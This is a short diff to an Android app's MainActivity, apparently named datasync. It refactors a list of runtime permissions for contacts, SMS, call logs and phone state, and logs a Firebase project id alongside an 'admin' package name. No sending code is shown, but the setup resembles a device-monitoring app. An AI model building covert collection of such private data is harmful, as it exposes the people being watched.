@@ -31,9 +31,11 @@ import com.boxx.datasync.sync.SyncService
 import com.boxx.datasync.sync.SyncScheduler
 import com.boxx.datasync.ui.component.PermissionExplanationScreen
 import com.boxx.datasync.ui.component.PermissionRationaleDialog
+import com.boxx.datasync.domain.repository.DataRepository
 import com.boxx.datasync.ui.screen.MainScreen
 import com.boxx.datasync.ui.viewmodel.MainViewModel
 import dagger.hilt.android.AndroidEntryPoint
+import javax.inject.Inject
 
 @AndroidEntryPoint
 class MainActivity : ComponentActivity() {
@@ -43,23 +45,23 @@ class MainActivity : ComponentActivity() {
     @Inject
     lateinit var repository: DataRepository
 
+    private val requiredPermissions = mutableListOf(
+        Manifest.permission.READ_CONTACTS,
+        Manifest.permission.READ_SMS,
+        Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.READ_PHONE_STATE
+    ).apply {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            add(Manifest.permission.POST_NOTIFICATIONS)
+        }
+    }.toTypedArray()
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
         Log.d("MainActivity", "PROJECT_SCAN_DONE")
         Log.d("MainActivity", "FIREBASE_CONFIG_VERIFIED project_id=boxxx-40178 userPackage=com.boxx.datasync adminPackage=com.datasync.admin")
         viewModel.updateHeartbeat()
-
-        val initialPermissions = mutableListOf(
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.READ_SMS,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_PHONE_STATE
-        ).apply {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                add(Manifest.permission.POST_NOTIFICATIONS)
-            }
-        }.toTypedArray()
 
         setContent {
             MaterialTheme(
